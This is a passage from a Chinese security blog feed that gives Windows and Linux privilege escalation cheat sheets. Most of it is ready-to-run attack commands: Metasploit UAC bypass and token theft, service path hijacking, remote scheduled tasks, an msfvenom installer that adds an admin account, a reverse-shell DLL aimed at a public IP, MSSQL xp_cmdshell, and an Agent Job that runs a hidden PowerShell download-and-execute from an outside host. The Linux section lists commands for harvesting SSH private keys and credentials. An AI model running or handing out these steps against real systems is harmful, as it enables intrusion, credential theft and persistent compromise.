id="Windows权限升级绕过UAC保护（通过COM处理程序劫持）"><a href="#Windows权限升级绕过UAC保护（通过COM处理程序劫持）" class="headerlink" title="Windows权限升级绕过UAC保护（通过COM处理程序劫持）"></a><strong>Windows权限升级绕过UAC保护（通过COM处理程序劫持）</strong></h3><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_comhijackmsf exploit(windows/local/bypassuac_comhijack) &gt; set session 1msf exploit(windows/local/bypassuac_comhijack) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235844933.png" alt="image-20220312235844933"></p><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a><strong>令牌窃取</strong></h2><p><strong>适用于2008之前版本</strong></p><p><strong>令牌简介</strong></p><p>描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。一般用户双击运行一个进程都会拷贝explorer.exe的Access Token。访问令牌分为：</p><p>* 授权令牌（Delegation token）：交互式会话登陆（例：本地用户登陆、用户桌面等）</p><p>* 模拟令牌（Impersonation token）：非交互式登陆（例：net use 访问共享文件）</p><p>两种token只有在系统重启后才会清除；授权令牌在用户注销后，该令牌会变为模拟令牌依旧有效。</p><p>同样也可以这样理解，<strong>当前系统中的某个进程或线程能访问到什么样的系统资源,完全取决于你当前进程是拿着谁的令牌。</strong></p><p>默认情况下，我们列举令牌，只能列举出当前用户和比当前用户权限更低用户的令牌。令牌的数量取决于当前shell的访问级别，如果当前的权限是一个普通域用户，所以令牌窃取只能窃取到当前用户本身是。如果当前的shell是administrator或者是system，我们就可以看到系统中的所有的令牌。</p><p><strong>攻击方法</strong></p><p><strong>第一种首先提前获取一个session</strong></p><pre><code class="text">meterpreter &gt; use incognitometerpreter &gt; list_tokens -umeterpreter &gt; impersonate_token WIN-2HU3N1\\Administrator #注意：这里是两个反斜杠\\</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220313002103573.png" alt="image-20220313002103573"></p><p><strong>第二种借用Rotten potato程序</strong></p><p>链接:<a href="https://github.com/foxglovesec/RottenPotato.git">https://github.com/foxglovesec/RottenPotato.git</a></p><pre><code class="text">meterpreter &gt; use incognitometerpreter &gt; list_tokens -uWIN-2HU3N1\Administratormeterpreter &gt; upload /root/Rottenpotato/rottenpotato.exeSuccessfullymeterpreter &gt; execute -HC -f rottenpotato.exeSuccessfullymeterpreter &gt; getuid...NT AUTHORITY\SYSTEM</code></pre><h2 id="烂土豆提权-MS16-075"><a href="#烂土豆提权-MS16-075" class="headerlink" title="烂土豆提权-MS16-075"></a><strong>烂土豆提权-MS16-075</strong></h2><p><strong>一般烂土豆需要来配合令牌窃取来进行提权</strong></p><p><strong>注意（重点：用烂土豆配合本地用户提权是成功不了的，必须是web权限或数据库权限）</strong></p><ol><li>单纯令牌窃取：Web权限或本地权限</li><li>配合烂土豆提权：web权限或数据库等权限</li></ol><p><strong>烂土豆提权原理</strong></p><ol><li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</li><li>对这个认证过程使用中间人攻击（NTLM重放），为”NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li><li>模仿这个令牌。只有具有”模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li></ol><p>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。</p><p><strong>攻击方法</strong></p><pre><code class="text">meterpreter &gt; upload /root/Rottenpotato/rottenpotato.exemeterpreter &gt; execute -HC -f rottenpotato.exemeterpreter &gt; use incognitometerpreter &gt; list_tokens -u</code></pre><p>会发现令牌列表里面存在system的令牌，在用system的令牌进行提权</p><p>Juicy Potato的限制条件如下：</p><p>1、需要支持SeImpersonate或者SeAssignPrimaryToken权限<br>2、开启DCOM<br>3、本地支持RPC或者远程服务器支持PRC并能成功登录<br>4、能够找到可用的COM对象</p><p>一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。一般大多数的服务型账户IIS、MSSQL等，有这个权限，大多数用户级的账户没有这个权限，这些都可以whoami /priv 试一下看看有没有模仿权限。</p><p><strong>烂土豆版本</strong></p><p>RottonPatato脚本：</p><ol><li><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></li><li><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a></li><li><a href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></li></ol><h2 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a><strong>可信任服务路径漏洞</strong></h2><p><strong>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的</strong></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>这里假设有一个服务路径 C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe</p><ol><li>带引号时：”C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe”会被看成一个完整的服务路径，故不会产生漏洞。</li><li>不带引号时：我们认为的服务路径是C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe，但是由于没有双引号的包裹，Windows会认为C:\Program空格后面的为Program这个程序的参数来进行启动服务。这样攻击者就可以命名一个为Program.exe的后门文件放在c盘下，进而等待含漏洞服务路径的启动或重启导致后门文件的执行。</li></ol><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>寻找存在漏洞的服务</p><pre><code class="text">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349775-559246082.png" alt="img"></p><p>把我们后门文件重命名放在对应的文件路径下</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350108-1640161384.png" alt="img"></p><p>  在msf上进行监听，然后启动对应服务</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350469-809846620.png" alt="img"></p><p>接收到shell，且是system权限</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350841-1807683012.png" alt="img"></p><pre><code class="text">#msf检测攻击模块exploit/windows/local/unquoted_service_path#正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程set AutoRunScript migrate -f</code></pre><pre><code class="text">#手动攻击我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下然后重启服务sc stop service_namesc start service_name</code></pre><h2 id="不安全服务权限配合计划任务schtasks或SC命令利用"><a href="#不安全服务权限配合计划任务schtasks或SC命令利用" class="headerlink" title="不安全服务权限配合计划任务schtasks或SC命令利用"></a><strong>不安全服务权限配合计划任务schtasks或SC命令利用</strong></h2><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用覆盖原来的服务路径，进而启动我们的恶意程序。（一般用来administrator提权到system，因为普通用户用sc修改服务路径会没有权限，导致不能用该方法提权。）</p><p>accesschk.exe -uwcqv “administrators” * #检查administrators组的权限配置（这里自己创建了一个test服务）</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351169-1682951443.png" alt="img"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351505-495496718.png" alt="img"></p><p>sc config “test” binpath=”C:\shell.exe” #用sc命令修改服务对应路径</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351871-824825594.png" alt="img"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352226-1488097995.png" alt="img"></p><p>sc start test #然后我们在msf监听，在启动该服务，就可以接收到我们的shell</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352599-1121177084.png" alt="img"></p><p>当然还可以用schtasks来定时启动服务，schtasks命令比at命令更灵活。而且在Windows Vista、Windows Server 2008及之后版本的操作系统已经弃用at命令。</p><p>#查看计算机的计划任务<br>schtasks /query /fo LIST /v</p><p>schtasks /create /s 10.10.10.80 /tn test /sc onstart /tr c:\artifact.exe /ru system /f</p><p>在远程主机运行”test”任务</p><p>schtasks /run /s 10.10.10.80 /i /tn “test”</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352923-1541900357.png" alt="img"></p><p> 执行完成之后就删除计划任务</p><p>schtasks /delete /s 10.10.10.80 /tn “test” /f</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353205-57489983.png" alt="img"></p><p> 接着删除IPC$</p><p>net use \10.10.10.80 /del /y</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353471-1410299606.png" alt="img"></p><p> 在使用schtasks命令的时候会在系统留下日志文件C:WindowsTasksSchedLgU.txt。</p><p><strong>参数的意思：</strong></p><p>/create 表示创建计划任务</p><p>/tn 表示任务名</p><p>/tr 指定运行的文件</p><p>/sc 是任务运行频率</p><p>/st 是执行时间</p><p>/s 指定远程机器名或 ip 地址</p><p>/ru 指定运行任务的用户权限，这里指定为最高的 SYSTEM</p><p>/i 表示立即运行</p><p>/F 表示如果指定的任务已经存在，则强制创建任务并抑制警告</p><p>/delete 是删除任务。</p><h2 id="Unattended-Installs（自动安装）"><a href="#Unattended-Installs（自动安装）" class="headerlink" title="Unattended Installs（自动安装）"></a><strong>Unattended Installs（自动安装）</strong></h2><p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p><p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p><pre><code class="text">C:\Windows\Panther\C:\Windows\Panther\Unattend\C:\Windows\System32\C:\Windows\System32\sysprep\</code></pre><p>除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。</p><pre><code class="text">C:\Users\user\Desktop&gt; dir C:*vnc.ini /s /b /c</code></pre><p>或者在名称中包含关键词的项目：</p><pre><code class="text">C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr *password*</code></pre><p>或者可以在文件内容中搜索password之类的关键字：</p><pre><code class="text">C:\Users\user\Desktop&gt;findstr /si password *.txt | *.xml | *.ini</code></pre><p>可以查询注册表，例如，字符串password：</p><pre><code class="text">reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s</code></pre><p>在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密 码需要去掉最后的”Password”。</p><p><strong>msf模块</strong>:</p><pre><code class="text">post/windows/gather/enum_unattend</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353799-254963719.png" alt="img"></p><h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a><strong>AlwaysInstallElevated</strong></h2><p>AlwaysInstallElevated 是一种允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。</p><p>可以通过查询以下注册表项来识别此设置：</p><pre><code class="text">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001</code></pre><p>使用reg query命令查询是否存在漏洞:</p><pre><code class="text">C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedorC:&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><p>如果系统没这个漏洞，它将输出错误:</p><pre><code class="text">ERROR: The system was unable to find the specified registry key or value.</code></pre><p>如果存在漏洞，上面将输出以下内容:</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165354233-1421529420.png" alt="img"></p><p>然后我们使用msfvenom生成msi文件，进行提权</p><pre><code class="text">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msimsiexec /quiet /qn /i C:\programdata\rotten.msi# /quiet 安装过程中禁止向用户发送消息# /qn 不使用GUI# /i 安装程序</code></pre><p>msf下的自动模块<br>exploit/windows/local/always_install_elevated</p><h2 id="DLL劫持提权"><a href="#DLL劫持提权" class="headerlink" title="DLL劫持提权"></a><strong>DLL劫持提权</strong></h2><p><strong>原理</strong>：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><p>1、应用程序加载的目录</p><p>2、C:\Windows\System32</p><p>3、C:\Windows\System</p><p>4、C:\Windows</p><p>5、当前工作目录Current Working Directory，CWD</p><p>6、在PATH环境变量的目录（先系统后用户）</p><p>过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功</p><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/test.dll</p><h2 id="常用系统漏洞CVE"><a href="#常用系统漏洞CVE" class="headerlink" title="常用系统漏洞CVE"></a><strong>常用系统漏洞CVE</strong></h2><p>#Windows10</p><p>CVE-2020-0796 <a href="https://www.cnblogs.com/-chenxs/p/12618678.html">https://www.cnblogs.com/-chenxs/p/12618678.html</a></p><p>#Windows7/2008</p><p>CVE-2018-8120 <a href="https://www.cnblogs.com/-mo-/p/11404598.html">https://www.cnblogs.com/-mo-/p/11404598.html</a></p><p>#Windows7/8、2008/2012/2016</p><p>CVE-2017-0213 <a href="https://www.cnblogs.com/-mo-/p/11446144.html">https://www.cnblogs.com/-mo-/p/11446144.html</a></p><p>#SQL Server、IIS通杀 (针对本地用户的，不能用于域用户)</p><p>MS16-075(RottenPotato) <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><h1 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h1><p>先来了解一下怎么才能获取到数据库的账号密码？<br>配置文件中，如：conn、config、data、sql、common 、inc文件中<br>安装目录下，如mysql安装目录下的user.MYD文件<br>使用Bruter工具破解—前提是开启了远程连接<br>使用脚本文件获取</p><p><strong>怎么打开远程连接？</strong><br>root账户一般只能本地访问，但在开发过程中可能需要打开root的远程访问权限。<br>登录到mysql中，为root进行远程访问的授权，执行下面的命令：</p><pre><code>GRANT ALL PRIVILEGES ON *.* TO root@&quot;%&quot; IDENTIFIED BY &quot;root&quot;;flush privileges;</code></pre><p>第一句中”%”表示任何主机都可以远程登录到该服务器上访问。如果要限制只有某台机器可以访问，将其换成相应的IP即可<br>第二句表示从mysql数据库的grant表中重新加载权限数据。因为MySQL把权限都放在了cache中，所以在做完更改后需要重新加载。</p><p><strong>提权</strong>:</p><h2 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h2><h3 id="udf提权："><a href="#udf提权：" class="headerlink" title="udf提权："></a>udf提权：</h3><p>通过创建用户自定义函数，对mysql功能进行扩充，可以执行系统任意命令，将mysql账号root转化为系统system权限。</p><h3 id="mof提权："><a href="#mof提权：" class="headerlink" title="mof提权："></a>mof提权：</h3><p>在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof 这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。<br>启动项提权：将后面脚本上传到系统启动目录，当服务器重启就会自动执行该脚本，从而获取系统权限。</p><h2 id="SQL-Server-提权"><a href="#SQL-Server-提权" class="headerlink" title="SQL Server 提权"></a>SQL Server 提权</h2><p>利用SQL Sercer执行系统命令的方式也有多种，比如xp_cmdshell、SP_OACREATE、沙盒、Agent Job、CLR来提权。</p><h3 id="使用xp-cmdshell进行提权："><a href="#使用xp-cmdshell进行提权：" class="headerlink" title="使用xp_cmdshell进行提权："></a>使用xp_cmdshell进行提权：</h3><pre><code class="text"># 启用xp_cmdshellEXEC master..sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC master..sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;# 通过xp_cmdshell执行系统命令Exec master.dbo.xp_cmdshell &#39;whoami&#39;</code></pre><h3 id="SP-OACREATE"><a href="#SP-OACREATE" class="headerlink" title="SP_OACREATE:"></a>SP_OACREATE:</h3><pre><code class="text"># 开启组件EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;RECONFIGURE WITH OVERRIDE;   EXEC sp_configure &#39;show advanced options&#39;, 0;# 执行系统命令（无回显）declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami&#39;</code></pre><h3 id="通过沙盒执行命令"><a href="#通过沙盒执行命令" class="headerlink" title="通过沙盒执行命令"></a>通过沙盒执行命令</h3><pre><code class="text"># 开启沙盒exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1# 利用jet.oledb执行命令select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)</code></pre><h3 id="通过Agent-Job执行命令"><a href="#通过Agent-Job执行命令" class="headerlink" title="通过Agent Job执行命令"></a>通过Agent Job执行命令</h3><p>修改开启Ageent Job，执行无回显CobaltStrike生成powershell上线</p><pre><code class="text">USE msdb; EXEC dbo.sp_add_job @job_name = N&#39;test_powershell_job1&#39; ; EXEC sp_add_jobstep @job_name = N&#39;test_powershell_job1&#39;, @step_name = N&#39;test_powershell_name1&#39;, @subsystem = N&#39;PowerShell&#39;, @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.214.129:80/a&#39;&#39;))&quot;&#39;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#39;test_powershell_job1&#39;; EXEC dbo.sp_start_job N&#39;test_powershell_job1&#39;;</code></pre><p>整体思路<br>1.通过各种漏洞拿到shell<br>2.找网站的配置文件（找账号、密码）<br>3.使用 工具 提权</p><p>数据库防御<br>1、限止数据库远程连接，给数据库帐户设置密码必须&gt;8位以上并数字+字母+特殊符号等。<br>2、不要给网站配置root或SA权限。必须给每个网站独立分配数据库帐户并限格控制好权限。<br>3、及时升级数据库补丁。<br>4、安装Waf进行防御。<br>5、购买数据库审计设备。</p><p><strong>基本转自随风师傅，做了点小小改动，因为自己太菜了写不出来这么好的文章，随风师傅tql:<a href="https://www.cnblogs.com/sfsec/p/15162635.html">https://www.cnblogs.com/sfsec/p/15162635.html</a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;为什么要提权：当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行管理员权限下的一下命令或者读取一些重要文件</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="windows提权" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/windows%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://sakurahack-y.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权总结</title>
    <link href="https://sakurahack-y.github.io/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2022-03-11T08:35:03.000Z</published>
    <updated>2022-03-11T09:20:44.334Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为什么要提权"><a href="#为什么要提权" class="headerlink" title="为什么要提权?"></a>为什么要提权?</h1><p>当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行root 权限下的一下命令或者读取/root  下的重要文件。这个时候就需要提权，在root  权限下，还可以通过msfvenom生成其他后门文件或者一些隐藏后门。添加用户，开启其他端口等操作，达到权限持续控制。</p><h1 id="什么是权限"><a href="#什么是权限" class="headerlink" title="什么是权限"></a>什么是权限</h1><p>在Linux 系统中，<code>ls -al</code> 即可查看列出文件所属的权限。</p><p><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220311164240865.png" alt="image-20220311164240865"></p><p>分析:</p><pre><code class="php">-rw-r--r--.  1 root root   176 5月  18 2020 .bash_profile</code></pre><p><strong>第一组数据</strong></p><pre><code class="php">-rw-r--r--</code></pre><p>第一位：</p><p><code>-</code> : 代表普通文件</p><p><code>d</code>：代表目录</p><p><code>l</code>：代表软链接</p><p><code>b</code>：代表块文件</p><p><code>c</code>：代表字符设备</p><p>第二及后面几位,分别三个为一组：</p><pre><code class="php">rw-r--r--  代表文件所属的权限</code></pre><p>r : 文件可读。w : 文件可修改。- : 表示暂时没有其他权限。x : 表示可执行</p><p>第一个<code>rw-</code> 表示文件所拥有者的权限。</p><p>第二个<code>r--</code> 表示文件所在组的用户的权限。</p><p>第三个<code>r--</code>  表示其他组的用户的权限。</p><p><strong>第二组数据</strong></p><pre><code>1</code></pre><ul><li>如果文件类型为目录，表示目录下的字目录个数</li><li>如果文件类型是普通文件，这个数据就表示这个文件的硬链接个数</li></ul><p><strong>第三组数据</strong></p><pre><code>root</code></pre><p>表示该文件所有者为root 用户</p><p><strong>第四组数据</strong></p><pre><code>root</code></pre><p>表示该文件所在组为root 组</p><p><strong>第五组数据</strong></p><pre><code>176</code></pre><p>表示文件的大小为多少字节。如果为一个目录，则为4096。</p><p><strong>第六组数据</strong></p><pre><code>5月  18 2020</code></pre><p>表示最后一次修改时间</p><p><strong>第七组数据</strong></p><pre><code>.bash_profile</code></pre><p>表示文件名称</p><p>如果为目录，r 表示可以进入该目录进行查看,w 表示文件可以进行增加,x 表示可以进入这个目录.</p><p>同样的，可以用数字代替，r=4,w=2,x=1。</p><h1 id="怎么样提权"><a href="#怎么样提权" class="headerlink" title="怎么样提权"></a>怎么样提权</h1><p>提权的本质是信息搜集。</p><h2 id="基础信息搜集"><a href="#基础信息搜集" class="headerlink" title="基础信息搜集"></a>基础信息搜集</h2><h3 id="自动化信息搜集工具"><a href="#自动化信息搜集工具" class="headerlink" title="自动化信息搜集工具"></a>自动化信息搜集工具</h3><p>LinEnum:<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p>linuxprivchecker:<a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a> </p><h3 id="自动化漏洞探测工具"><a href="#自动化漏洞探测工具" class="headerlink" title="自动化漏洞探测工具"></a>自动化漏洞探测工具</h3><p>linux-exploit-suggester:<a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p>linux-exploit-suggester2:<a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a> </p><h3 id="内核，操作系统，设备信息"><a href="#内核，操作系统，设备信息" class="headerlink" title="内核，操作系统，设备信息"></a>内核，操作系统，设备信息</h3><pre><code>uname -a    打印所有可用的系统信息uname -r    内核版本uname -n    系统主机名。uname -m    查看系统内核架构（64位/32位）hostname    系统主机名cat /proc/version    内核信息cat /etc/*-release   分发信息cat /etc/issue       分发信息cat /proc/cpuinfo    CPU信息cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhatls /boot | grep vmlinuz-</code></pre><h3 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h3><pre><code>cat /etc/passwd     列出系统上的所有用户cat /var/mail/rootcat /var/spool/mail/rootcat /etc/group      列出系统上的所有组grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 &#123; print $1&#125;&#39;      列出所有的超级用户账户whoami              查看当前用户w                   谁目前已登录，他们正在做什么last                最后登录用户的列表lastlog             所有用户上次登录的信息lastlog –u %username%  有关指定用户上次登录的信息lastlog |grep -v &quot;Never&quot;  以前登录用户的完</code></pre><h3 id="用户权限信息"><a href="#用户权限信息" class="headerlink" title="用户权限信息"></a>用户权限信息</h3><pre><code>whoami        当前用户名id            当前用户信息cat /etc/sudoers  谁被允许以root身份执行sudo -l       当前用户可以以root身份执行操作</code></pre><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><pre><code>env        显示环境变量set        现实环境变量echo %PATH 路径信息history    显示当前用户的历史命令记录pwd        输出工作目录cat /etc/profile   显示默认系统变量cat /etc/shells    显示可用的shellrccat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logout</code></pre><h3 id="进程和服务"><a href="#进程和服务" class="headerlink" title="进程和服务"></a>进程和服务</h3><pre><code>ps auxps -eftopcat /etc/services</code></pre><p>查看以root 运行的进程</p><pre><code>ps aux | grep rootps -ef | grep root</code></pre><h3 id="查看安装的软件"><a href="#查看安装的软件" class="headerlink" title="查看安装的软件"></a>查看安装的软件</h3><pre><code>ls -alh /usr/bin/ls -alh /sbin/ls -alh /var/cache/yum/dpkg -l</code></pre><h3 id="服务-插件"><a href="#服务-插件" class="headerlink" title="服务/插件"></a>服务/插件</h3><p>检查有没有不安全的服务配置，和一些有漏洞的插件。</p><pre><code>cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/</code></pre><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><pre><code>crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root</code></pre><h3 id="有无明文存放用户密码"><a href="#有无明文存放用户密码" class="headerlink" title="有无明文存放用户密码"></a>有无明文存放用户密码</h3><pre><code>grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find , -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;</code></pre><p>Vulnhub 上的靶机就体现在，通过邮件明文传输密码了，然后就可以通过ssh登陆了。进行新的信息搜集。</p><h3 id="有无ssh-私钥"><a href="#有无ssh-私钥" class="headerlink" title="有无ssh 私钥"></a>有无ssh 私钥</h3><pre><code>cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key</code></pre><h3 id="查看与当前机器通信的其他用户或者主机"><a href="#查看与当前机器通信的其他用户或者主机" class="headerlink" title="查看与当前机器通信的其他用户或者主机"></a>查看与当前机器通信的其他用户或者主机</h3><pre><code>lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw</code></pre><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><pre><code>cat 